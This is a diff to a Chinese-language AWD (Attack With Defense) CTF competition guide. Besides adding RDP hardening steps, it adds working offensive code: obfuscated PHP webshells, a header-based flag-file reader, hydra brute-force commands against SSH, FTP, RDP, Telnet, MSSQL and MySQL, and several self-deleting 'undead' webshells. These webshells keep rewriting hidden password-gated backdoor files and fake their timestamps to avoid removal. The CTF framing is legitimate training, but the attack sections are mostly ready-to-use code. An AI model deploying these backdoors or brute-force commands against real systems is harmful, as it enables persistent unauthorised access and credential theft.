@@ -16,13 +16,15 @@
 
 ### 0.1# AWD赛制介绍
 
-AWD赛制是一种网络安全竞赛的赛制。将真实服务器设施和渗透测试人员加入抽象的网络环境中，模拟政府、企业、院校等单位的典型网络结构和配置，开展的一种人人对抗的竞赛方式，考验参赛者攻防兼备的能力。
+「 攻防模式 | AWD (Attack With Defense) 」 是 CTF比赛 「CTF Capture The Flag」 几种主要的比赛模式之一，该模式常见于线下赛。
+
+在该模式中，每个队伍都拥有一个相同的初始环境 ( 我们称其为 GameBox )，该环境通常运行着一些特定的服务或应用程序，而这些服务通常包含一些安全漏洞。参赛队伍需要挖掘利用对方队伍服务中的安全漏洞，获取 Flag 以获得积分; 同时，参赛队伍也需要修补自身服务漏洞进行防御，以防被其他队伍攻击和获取 Flag。
 
 主要特点为：强调实战性、实时性、对抗性，综合考量竞赛队的渗透能力和防护能力。
 
 ### 0.2# 比赛整体流程
 
-- 赛前准备环节：我们会分配到多个靶机服务器，通常是分配给我们 `SSH` 用户名和密码，还有相关IP等信息
+- 赛前准备环节：我们会分配到多个靶机服务器，通常是分配给我们 `SSH` 或者 `VNC` 的用户名和密码，还有相关IP等信息
 - 安全加固环节：我们需要先自己去登录靶机服务器，进行30分钟的安全加固（源码备份/弱口令修改/代码审计和修复/漏洞修复等）
 - 自由攻击环节：安全加固时间过后，开始自由攻击环节，通过对别的队伍的靶机服务器进行攻击（弱口令/Web漏洞/系统漏洞等）获得Flag进行加分，对应队伍失分
 
@@ -348,6 +350,21 @@ sudo service sshd restart
 sudo systemctl restart sshd.service
 ```
 
+#### 2.4.2 RDP远程登录安全加固
+
+删除默认帐户并手动添加新用户：
+
+- 步骤1：按 `Win + R` 打开运行对话框，输入 `secpol.msc` 并单击 “确定”
+- 步骤2：导航至此处：本地策略-->用户权限分配，再双击打开 “允许通过远程桌面服务登录”
+- 步骤3：删除此窗口中列出的管理员和远程桌面用户（或计算机上的任何其他用户或组）
+- 步骤4：之后单击 “添加用户或组” 并手动添加您要授予远程桌面访问权限的用户
+
+更改默认RDP端口号：
+
+- 步骤1：打开运行对话框，输入 `regedit` 并单击 “确定”
+- 步骤2：打开 `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp` ，向下滚动并找到 `PortNumber` 然后双击它
+- 步骤3：选择 “十进制”，修改为您想要设置的端口号，然后单击 “确定”
+
 ### 2.5# 应急响应
 
 #### 2.5.1 查询进程线程
@@ -517,12 +534,10 @@ Asp：   <%eval request ("pass")%>
 Aspx：  <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
 ```
 
-get型木马
+Get型木马
 
 ```php
-<?php eval($_GET['pass']);
-
-#利用方式/shell.php?pass=eval($_POST[1]);
+<?php eval($_GET['pass']);           //利用方式/shell.php?pass=eval($_POST[1]);
 ```
 
 免杀马制作：[https://github.com/AabyssZG/WebShell-Bypass-Guide](https://github.com/AabyssZG/WebShell-Bypass-Guide)
@@ -531,6 +546,15 @@ get型木马
 <?=~$_='$<>/'^'{{{{';@${$_}[_](@${$_}[__]);                            //执行GET传参 ?_=system&__=whoami 来执行whoami命令
 <?=~$_='$<>/'^'{{{{';$___='$+4(/' ^ '{{{{{';@${$_}[_](@${$___}[__]);   //执行GET传参 ?_=assert 和POST传参 __=PHP代码来GetShell
 ```
+
+隐藏的文件读取
+
+```php
+<?php
+header(php'flag:'.file_get_contents('/flag'));
+```
+
+条件允许的话，将flag信息直接读取并返回到header头中，这样做不易被发现
 
 #### 3.2.5 利用WebShell
 
@@ -576,82 +600,7 @@ for i in range(8000,8004):
 flag.close()
 ```
 
-#### 3.2.6 不死马
-
-简单不死马
-
-```php
-<?php
-set_time_limit(0);   //PHP脚本限制了执行时间，set_time_limit(0)设置一个脚本的执行时间为无限长
-ignore_user_abort(1);  //ignore_user_abort如果设置为 TRUE，则忽略与用户的断开,脚本将继续运行。
-unlink(__FILE__);     //删除自身
-
-while(1)
-{
-    file_put_contents('shell.php','<?php @eval($_POST["password"]);?>');  //创建shell.php
-    sleep(0);    //间隔时间
-}
-```
-
-**可以通过不断复写shell.php来达到该木马难以被使用的效果**
-
-```php
-<?php
-set_time_limit(0);   // 取消脚本运行时间的超时上限
-ignore_user_abort(1);  // 后台运行
-
-while(1)
-{
-    file_put_contents('shell.php','11111111');  //创建shell.php
-    sleep(0);
-}
-```
-
-进阶不死马
-
-```php
-<?php
-ignore_user_abort(true);
-set_time_limit(0);
-unlink(__FILE__);
-$file = 'shell.php';
-$code = '<?php if(md5($_POST["passwd"])=="6daf17e539bf44591fad8c81b4a293d7"){@eval($_REQUEST['cmd']);} ?>';
-while (1){
-    file_put_contents($file,$code);
-    system('touch -m -d "2018-12-01 09:10:12" shell2.php');  //修改时间，防止被删
-    usleep(5000);
-}
-?>
-
-//passwd=y0range857
-//POST传参：passwd=y0range857&a=system('ls');
-```
-
-将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为shell2.php的shell文件
-
-写入shell， yj.php内容
-
-```php
-<?php
-ignore_user_abort(true);
-set_time_limit(0);
-unlink(__FILE__);
-$file = '.login.php';
-$file1 = '/admin/.register.php'; 
-$code = '<?php if(md5($_GET["passwd"])=="6daf17e539bf44591fad8c81b4a293d7"){@eval($_REQUEST["at"]);} ?>';
-while (1){
-    file_put_contents($file,$code);
-    system('touch -m -d "2018-12-01 09:10:12" .login.php');
-    file_put_contents($file1,$code);
-    system('touch -m -d "2018-12-01 09:10:12" /admin/.register.php');
-    usleep(5000);
-}
-?>
-```
-
-浏览器访问 `yj.php`，会生成不死马 `.login.php` 和 `/admin/.register.php`
-
-#### 3.2.7 MySQL数据库利用
+#### 3.2.6 MySQL数据库利用
 
 具体可以看这篇文章：[https://blog.zgsec.cn/archives/26.html](https://blog.zgsec.cn/archives/26.html)
 
@@ -691,35 +640,133 @@ select host, user, password from mysql.user;
 select host,user,authentication_string from mysql.user;
 ```
 
-### 3.3# 内网渗透
+#### 3.2.7 弱口令爆破
 
-#### 3.3.1 权限维持
+爆破SSH密码
 
-1、不死马
-
-```php
-<?php 
-ignore_user_abort(true);  #客户机断开依旧执行
-set_time_limit(0); #函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。
-unlink(__FILE__);  #删除文件本身，以起到隐蔽自身的作用。
-$file = '2.php';
-$code = '<?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?>';
-while (1){
-    file_put_contents($file,$code);
-    system('touch -m -d "2018-12-01 09:10:12" .2.php');
-    usleep(5000);
-} 
-?>
+```c
+hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 ssh
+hydra -L 用户名字典.txt -P 密码字典.txt ssh://192.168.1.100
+hydra -L 用户名字典.txt -P 密码字典.txt ssh://192.168.1.100 -s 40      //40是⽬标服务开放的端⼝
 ```
 
-2、隐藏的文件读取
+爆破FTP密码
+
+```c
+hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 ftp
+hydra -L 用户名字典.txt -P 密码字典.txt ftp://192.168.1.100/
+```
+
+爆破RDP远程桌面密码
+
+```c
+hydra 目标IP地址 rdp -l administrator -P 密码字典.txt -V
+```
+
+爆破Telnet
+
+```c
+hydra 目标IP地址 telnet -l 用户字典.txt -P 密码字典.txt -f -V
+```
+
+爆破MSSQL数据库
+
+```c
+hydra -l sa -P 密码字典.txt 目标IP地址 mssql
+```
+
+爆破MySQL数据库
+
+```c
+hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 mysql
+```
+
+### 3.3# 内网渗透
+
+#### 3.3.1 权限维持之不死马
+
+简单不死马：
 
 ```php
 <?php
-header(php'flag:'.file_get_contents('/tmp/flag'));
+set_time_limit(0);   //PHP脚本限制了执行时间，set_time_limit(0)设置一个脚本的执行时间为无限长
+ignore_user_abort(1);  //ignore_user_abort如果设置为 TRUE，则忽略与用户的断开，脚本将后台运行
+unlink(__FILE__);     //删除自身
+
+while(1)
+{
+    file_put_contents('shell.php','<?php @eval($_POST["AabyssTeam"]);?>');  //创建shell.php
+    sleep(0);    //间隔时间
+}
 ```
 
-条件允许的话，将flag信息直接读取并返回到header头中，这样做不易被发现
+可以通过不断复写 `shell.php` 来达到该木马难以被使用的效果
+
+防连接不死马：
+
+```php
+<?php
+set_time_limit(0);   // 取消脚本运行时间的超时上限
+ignore_user_abort(1);  // 
+
+while(1)
+{
+    file_put_contents('shell.php','<?php if(md5($_POST["passwd"])=="8c7d608cbb4c63f32be59a9ba8c9f49d"){@eval($_REQUEST["cmd"]);} ?>');  //创建shell.php
+    sleep(0);
+}
+
+//passwd=AabyssTeam
+//POST传参：passwd=AabyssTeam&cmd=system('ls');
+```
+
+进阶不死马：
+
+```php
+<?php
+ignore_user_abort(true);
+set_time_limit(0);
+unlink(__FILE__);
+$file = 'shell.php';
+$code = '<?php if(md5($_POST["passwd"])=="8c7d608cbb4c63f32be59a9ba8c9f49d"){@eval($_REQUEST["cmd"]);} ?>';
+
+while (1){
+    file_put_contents($file,$code);
+    system('touch -m -d "2020-12-01 09:10:12" shell.php');  //修改时间，防止被删
+    usleep(5000);
+}
+?>
+
+//passwd=AabyssTeam
+//POST传参：passwd=AabyssTeam&cmd=system('ls');
+```
+
+将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为 `shell.php` 的WebShell文件
+
+双重不死马：
+
+```php
+<?php
+ignore_user_abort(true);
+set_time_limit(0);
+unlink(__FILE__);
+$file = '.login.php';
+$file1 = '/admin/.register.php'; 
+$code = '<?php if(md5($_POST["passwd"])=="8c7d608cbb4c63f32be59a9ba8c9f49d"){@eval($_REQUEST["cmd"]);} ?>';
+
+while (1){
+    file_put_contents($file,$code);
+    system('touch -m -d "2020-12-01 18:10:12" .login.php');
+    file_put_contents($file1,$code);
+    system('touch -m -d "2020-12-01 18:10:12" /admin/.register.php');
+    usleep(5000);
+}
+?>
+
+//passwd=AabyssTeam
+//POST传参：passwd=AabyssTeam&cmd=system('ls');
+```
+
+浏览器访问写入的WebShell，会自动生成两个不死马： `.login.php` 和 `/admin/.register.php`
 
 #### 3.3.2 关键文件检索
 
